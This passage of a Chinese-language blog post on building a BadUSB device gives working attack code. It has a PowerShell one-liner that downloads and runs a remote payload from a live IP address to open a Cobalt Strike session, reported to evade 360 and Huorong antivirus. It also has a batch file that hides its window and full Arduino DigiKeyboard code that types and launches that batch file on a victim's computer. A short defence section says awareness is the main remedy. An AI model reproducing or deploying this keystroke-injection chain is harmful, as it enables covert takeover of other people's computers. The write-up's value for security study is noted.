+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="built_in">Invoke-Expression</span>(<span class="built_in">new-object</span> net.webclient).downloadstring(<span class="string">&#x27;http://43.139.114.127:1235/a&#x27;</span>) | powershell -</span><br></pre></td></tr></table></figure>
+
+<p>执行结果如下：</p>
+<p><img src="https://pic.imgdb.cn/item/6388ce7616f2c2beb1d0d2b7.png"></p>
+<p>成功绕过360与火绒，上线CS。</p>
+<h3 id="编写bat"><a href="#编写bat" class="headerlink" title="编写bat"></a>编写bat</h3><p>虽然上面的powershell命令混淆可以绕过360，但是似乎有一个痛点。那就是如果执行powershell后，cmd窗口会一直存在。要是cmd窗口被关掉了，那shell不就白拿了吗？因此我们需要找到一种方法不弹cmd窗口，让受害者难以发现，做到“润物细无声”。这里我找到的方法是跟上面绕过火绒的方法类似，但是不再是编写vbs文件了（因为360对于vbs文件的检测过于严格），而是编写bat文件。bat文件也可以执行系统命令，同时可以添加一些命令让命令行窗口消失，再加上360对于bat文件的检测较为宽松，因此将命令写入bat文件就成了我的首选。</p>
+<p>直接给出bat文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">@echo off </span><br><span class="line">if &quot;%1&quot;==&quot;h&quot; goto begin </span><br><span class="line">mshta vbscript:createobject(&quot;wscript.shell&quot;).run(&quot;%~nx0 h&quot;,0)(window.close) </span><br><span class="line">EXIT</span><br><span class="line">:begin </span><br><span class="line">cmd /k &quot;echo Invoke-Expression(new-object net.webclient).downloadstring(&#x27;http://43.139.114.127:1235/a&#x27;) | powershell -&quot; </span><br></pre></td></tr></table></figure>
+
+<h3 id="编写Arduino"><a href="#编写Arduino" class="headerlink" title="编写Arduino"></a>编写Arduino</h3><p>接着给出Arduino代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;DigiKeyboard.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setup</span><span class="params">()</span> &#123;</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;CMD&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_M);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_D);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_N);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">51</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_S);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">46</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">30</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">35</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_I);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_N);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_S);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">46</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">30</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">36</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">36</span>,MOD_SHIFT_LEFT);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_L);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_R);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_F);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_ENTER);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO @ECHO OFF &gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO IF \&quot;%1\&quot;==\&quot;H\&quot; GOTO BEGIN &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;SET/P=MSHTA VBSCRIPT:CREATEOBJECT(\&quot;WSCRIPT.SHELL\&quot;).RUN(\&quot;%~NX0 H\&quot;,0)(WINDOW.CLOSE)&gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;S&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO. &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_C);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_H);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_O);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_SPACE);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_E);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_X);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_I);</span><br><span class="line">DigiKeyboard.sendKeyStroke(KEY_T);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;&gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO :BEGIN &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">500</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;ECHO CMD /K \&quot;ECHO iNVOKE-eXPRESSION(NEW-OBJECT NET.WEBCLIENT).DOWNLOADSTRING(&#x27;HTTP://43.139.114.127:1235/A&#x27;) | POWERSHELL -\&quot; &gt;&gt; MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.println(<span class="string">&quot;MICROSOFT.BAT&quot;</span>);</span><br><span class="line">DigiKeyboard.delay(<span class="number">300</span>);</span><br><span class="line">DigiKeyboard.sendKeyStroke(<span class="number">57</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">loop</span><span class="params">()</span> &#123;</span><br><span class="line">   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看到这个代码相较Bypass 火绒的来说长了不少，这是因为我遇到了一个难以解决的问题。那就是我似乎不能直接写出下面这行代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DigiKeyboard.println(&quot;MODE CON: cols=16 lines=1 &amp;&amp; color fe&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>当我的代码中有这一行的时候无法烧录成功（但是我在上面绕过火绒部分写的Arduino代码却可以直接写这一行代码）。因此我找到了DigiKeyboard.h的按键对照表：<a target="_blank" rel="noopener" href="https://bobmckay.com/wp-content/uploads/2022/07/Hut1_12v2.pdf">https://bobmckay.com/wp-content/uploads/2022/07/Hut1_12v2.pdf</a>。在文件的第53页开始，写了每个按键相对应的数字，利用sendKeyStroke方法调用。</p>
+<p>代码虽然长，但是实际在命令行中输入的代码也并未增多。</p>
+<p>以下是演示效果：</p>
+<p><a target="_blank" rel="noopener" href="https://watch.wave.video/MnKvDgds25bwtIoc">https://watch.wave.video/MnKvDgds25bwtIoc</a></p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>在原理分析中提到，恶意代码写入在设备初始化固件中，而不是通过autorun.inf等媒体自动播放文件进行控制，因此无法通过禁用媒体自动播放进行防御，并且这部分区域是杀毒软件无法访问的区域， 所以杀毒软件更是无法检测设备固件中的恶意代码。</p>
+<p>因为无法阻止电脑识别键盘、鼠标或U盘此类HID设备，所以目前仍然没有什么有效的技术手段去防御BadUSB。尽管360安全卫士已经开发出所谓的防御BadUSB的功能——“变形虫防护”了，但在我在本地尝试这个功能时仍然可以get shell。</p>
+<p>因此面对这种攻击，我们只能提高自身的安全意识，不因为好奇心而去乱插可疑的U盘。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>个人认为只有拥有基础的安全知识，那么BadUSB的制作还是比较简单的，对于我而言最复杂的可能就是编写Arduino代码那部分了。同时也是第一次使用DigiKeyboard.h库，因此查阅了不少资料。不过这次制作完成之后，也算入了Arduino的门了，希望以后可以用Arduino写出一些好玩的东西吧。</p>
+
+  </div>
+</article>
+
+
+    <div class="blog-post-comments">
+        <div id="utterances_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BadUSB%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">BadUSB原理浅析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HID%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">HID攻击原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#BadUSB%E4%B8%AA%E4%BA%BA%E7%90%86%E8%A7%A3"><span class="toc-number">2.2.</span> <span class="toc-text">BadUSB个人理解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%87%86%E5%A4%87"><span class="toc-number">3.</span> <span class="toc-text">工具准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-%E7%81%AB%E7%BB%92"><span class="toc-number">4.</span> <span class="toc-text">Bypass 火绒</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#vbs%E7%BC%96%E5%86%99"><span class="toc-number">4.1.</span> <span class="toc-text">vbs编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E6%9C%A8%E9%A9%AC%E7%BC%96%E5%86%99"><span class="toc-number">4.2.</span> <span class="toc-text">免杀木马编写</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Arduino%E4%BB%A3%E7%A0%81"><span class="toc-number">4.3.</span> <span class="toc-text">编写Arduino代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-360"><span class="toc-number">5.</span> <span class="toc-text">Bypass 360</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#powershell%E5%85%8D%E6%9D%80"><span class="toc-number">5.1.</span> <span class="toc-text">powershell免杀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99bat"><span class="toc-number">5.2.</span> <span class="toc-text">编写bat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E5%86%99Arduino"><span class="toc-number">5.3.</span> <span class="toc-text">编写Arduino</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">防御</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">总结</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://r4inb00w.github.io/2022/12/01/badusb/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://r4inb00w.github.io/2022/12/01/badusb/&text=初探BadUSB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://r4inb00w.github.io/2022/12/01/badusb/&is_video=false&description=初探BadUSB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=初探BadUSB&body=Check out this article: https://r4inb00w.github.io/2022/12/01/badusb/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://r4inb00w.github.io/2022/12/01/badusb/&title=初探BadUSB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://r4inb00w.github.io/2022/12/01/badusb/&name=初探BadUSB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://r4inb00w.github.io/2022/12/01/badusb/&t=初探BadUSB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    1970-2099
+    rainb0w
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+    <script type="text/javascript">
+      var utterances_repo = 'r4inb00w/r4inb00w.github.io';
+      var utterances_issue_term = 'pathname';
+      var utterances_label = 'Comment';
+      var utterances_theme = 'github-dark';
+
+      (function(){
+          var script = document.createElement('script');
+
+          script.src = 'https://utteranc.es/client.js';
+          script.setAttribute('repo', utterances_repo);
+          script.setAttribute('issue-term', 'pathname');
+          script.setAttribute('label', utterances_label);
+          script.setAttribute('theme', utterances_theme);
+          script.setAttribute('crossorigin', 'anonymous');
+          script.async = true;
+          (document.getElementById('utterances_thread')).appendChild(script);
+      }());
+  </script>
+
+</body>
+</html>
